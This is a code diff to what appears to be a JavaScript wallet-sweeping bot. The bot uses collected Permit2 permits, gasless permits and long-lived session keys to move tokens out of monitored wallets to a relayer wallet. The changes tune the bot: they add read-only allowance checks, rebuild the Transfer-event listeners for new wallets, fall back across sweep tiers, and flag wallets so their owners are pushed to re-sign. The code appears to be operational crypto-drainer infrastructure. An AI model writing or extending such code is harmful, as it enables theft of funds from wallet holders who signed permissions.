@@ -198,11 +198,13 @@ const PERMIT2_BATCH_TRANSFER_ABI = [
   "function permitTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes calldata signature) external",
 ];
 
-// ── Wallet & contracts — ALL bound to rpcProvider (HTTP) ─────────────────────
+// ── Wallet & contracts ────────────────────────────────────────────────────────
 // RULE: wsProvider is NEVER passed to a Contract or Wallet.
+// RULE: permit2Read for all READ calls (allowance) — uses free scanProvider.
 
 const relayerWallet = new ethers.Wallet(PRIVATE_KEY, rpcProvider);
 const permit2       = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayerWallet);
+const permit2Read   = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, getReadProvider()); // reads only
 const permit2Batch  = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_BATCH_TRANSFER_ABI, relayerWallet);
 const contract      = CONTRACT_ADDRESS
   ? new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, relayerWallet)
@@ -221,6 +223,24 @@ const BACKOFF_MS       = [5_000, 10_000, 20_000, 40_000, 60_000];
 let reconnectAttempt   = 0;
 // Add ±20% random jitter to a backoff delay.
 function withJitter(ms) { return Math.floor(ms * (0.8 + Math.random() * 0.4)); }
+
+// ── WSS provider ref (for Transfer subscription rebuild) ──────────────────────
+let activeWsProvider = null;
+let _rebuildDebounce = null;
+function scheduleTransferRebuild() {
+  if (_rebuildDebounce) clearTimeout(_rebuildDebounce);
+  _rebuildDebounce = setTimeout(async () => {
+    if (!activeWsProvider || !TOKENS.length) return;
+    log(`[listeners] rebuilding Transfer subscriptions (${monitoredWallets.size} wallets)`);
+    try {
+      activeWsProvider.removeAllListeners();
+      await startTransferListeners(activeWsProvider, TOKENS);
+      await startNativeListener(activeWsProvider);
+    } catch (e) {
+      warn(`[listeners] rebuild failed: ${e.message}`);
+    }
+  }, 3_000);
+}
 
 // Tokens whose permit() always reverts (non-standard EIP-2612 implementations).
 const BLACKLISTED_EIP2612 = new Set([
@@ -523,7 +543,7 @@ async function sweepPermit2Wallet(walletAddress) {
       // Verify Permit2 allowance is set and not expired before any balance check
       let allowanceOk = false;
       try {
-        const [allowedAmount, expiration] = await permit2.allowance(
+        const [allowedAmount, expiration] = await permit2Read.allowance(
           checksum, tokenAddress, relayerWallet.address
         );
         allowanceOk = allowedAmount > 0n && expiration > nowSecs;
@@ -783,7 +803,7 @@ async function sweepGaslessWallet(walletAddress) {
     let needsPermit = false;
     for (const detail of permitBatch.details) {
       try {
-        const [amt, exp] = await permit2.allowance(checksum, detail.token, relayerWallet.address);
+        const [amt, exp] = await permit2Read.allowance(checksum, detail.token, relayerWallet.address);
         if (amt === 0n || exp <= nowSecs) { needsPermit = true; break; }
       } catch { needsPermit = true; break; }
     }
@@ -1341,7 +1361,7 @@ async function dispatchSweep(wallet) {
   }
 }
 
-// ── Universal sweep — 4 tiers ───────────────────────────────────────────────
+// ── Universal sweep — 6 tiers ───────────────────────────────────────────────
 
 async function sweep(wallet) {
   const checksum = normalizeAddress(wallet.address);
@@ -1349,6 +1369,13 @@ async function sweep(wallet) {
   const short = checksum.slice(0, 10);
   const nowSecs = BigInt(Math.floor(Date.now() / 1000));
   const addrKey = checksum.toLowerCase();
+
+  // "monitoring" wallets have no signatures — nothing to sweep.
+  // Skip immediately to avoid 3 wasted Supabase queries per Transfer event.
+  if (wallet.type === "monitoring") {
+    log(`[sweep] ${short} — type=monitoring, nothing actionable yet`);
+    return;
+  }
 
   // ══════════════════════════════════════════════════════════════════════════
   // TIER 0: SESSION KEY (ERC-7715) — relayer has 2-year permission
@@ -1461,7 +1488,7 @@ async function sweep(wallet) {
     if (pbData?.permit?.transfer_type === "permit-batch" && Array.isArray(pbData.permit.details)) {
       for (const detail of pbData.permit.details) {
         try {
-          const [p2Amount,, p2Exp] = await permit2.allowance(checksum, detail.token, relayerWallet.address);
+          const [p2Amount,, p2Exp] = await permit2Read.allowance(checksum, detail.token, relayerWallet.address);
           if (p2Amount === 0n || BigInt(p2Exp) < nowSecs) continue;
 
           const token = new ethers.Contract(detail.token, ERC20_ABI, getReadProvider());
@@ -1569,20 +1596,24 @@ async function sweep(wallet) {
       const dl  = BigInt(sig.deadline ?? 0);
 
       const spenderMatch = !sig.spender || sig.spender.toLowerCase() === relayerWallet.address.toLowerCase();
+      let tier4Valid = true;
       if (!spenderMatch) {
-        log(`[gasless] ❌ spender mismatch — stored: ${sig.spender}, bot: ${relayerWallet.address} — marking needs-reactivation`);
+        err(`[gasless] ❌ SPENDER MISMATCH — sig signed for ${sig.spender} but relayer is ${relayerWallet.address}`);
+        err(`[gasless] Set BOT_ADDRESS env var on backend to ${relayerWallet.address} and have user re-activate`);
         needsReauthWallets.add(addrKey);
         supabase.from("delegated_wallets").update({ needs_reactivation: true })
           .eq("address", addrKey).eq("chain", CHAIN).then().catch(() => {});
-        return;
-      }
-      if (dl > 0n && dl < nowSecs) {
-        log(`[gasless] ❌ expired — marking needs-reactivation`);
+        tier4Valid = false; // fall through to Tier 5, do NOT return
+      } else if (dl > 0n && dl < nowSecs) {
+        warn(`[gasless] ❌ signature expired (${new Date(Number(dl) * 1000).toISOString()}) — marking for re-activation`);
         needsReauthWallets.add(addrKey);
         supabase.from("delegated_wallets").update({ needs_reactivation: true })
           .eq("address", addrKey).eq("chain", CHAIN).then().catch(() => {});
-        return;
+        supabase.from("permit2_signatures").update({ spent: true })
+          .eq("id", stData.id).then().catch(() => {});
+        tier4Valid = false; // fall through to Tier 5, do NOT return
       }
+      if (tier4Valid) {
 
       const permitted = sig.permitted ?? [];
       const withBalance = [];
@@ -1634,7 +1665,15 @@ async function sweep(wallet) {
         withBalance.splice(0, withBalance.length, ...approved);
       }
 
-      if (withBalance.length === 0) { log(`[gasless] no tokens with Permit2 approval — skipping`); return; }
+      if (withBalance.length === 0) {
+        warn(`[gasless] no tokens with Permit2 approval — user must re-activate to approve ERC-20→Permit2`);
+        if (supabase) {
+          await supabase.from("delegated_wallets")
+            .update({ needs_reactivation: true })
+            .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+        }
+        return;
+      }
       log(`[gasless] sweeping ${withBalance.length} tokens`);
 
       try {
@@ -1668,6 +1707,7 @@ async function sweep(wallet) {
           }
         }
       }
+      } // closes if (tier4Valid)
     }
   }
 
@@ -2238,6 +2278,7 @@ function subscribeRealtime() {
         needsReconnect.delete(address.toLowerCase());
         needsReauthWallets.delete(address.toLowerCase());
         log(`[realtime] 🔔 ${isNew ? "new" : "updated"} wallet ${address.slice(0, 10)} (${type}) — checking balance`);
+        scheduleTransferRebuild();
         const balances = await checkAllBalances(address);
         const nonZero  = balances.filter(b => b.balance > 0n);
         if (nonZero.length > 0) {
@@ -2263,6 +2304,7 @@ function subscribeRealtime() {
         needsReconnect.delete(address.toLowerCase());
         needsReauthWallets.delete(address.toLowerCase());
         log(`[realtime] 🔄 re-activated ${address.slice(0, 10)} (${type}) — dispatching sweep`);
+        scheduleTransferRebuild();
         dispatchSweep({ address, type }).catch(e => log(`[realtime] sweep error: ${e.message}`));
       }
     )
@@ -2282,6 +2324,7 @@ function subscribeRealtime() {
 async function startBot() {
   try {
     const wsProvider = new ethers.WebSocketProvider(WS_URL);
+    activeWsProvider = wsProvider;
 
     wsProvider.websocket.on("error", (wsErr) => {
       warn(`[ws] error: ${wsErr?.message ?? wsErr}`);
@@ -2290,6 +2333,7 @@ async function startBot() {
     wsProvider.websocket.on("close", () => {
       warn("[ws] closed — removing listeners and reconnecting...");
       wsProvider.removeAllListeners();
+      activeWsProvider = null;
       const base  = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
       const delay = withJitter(base);
       reconnectAttempt++;
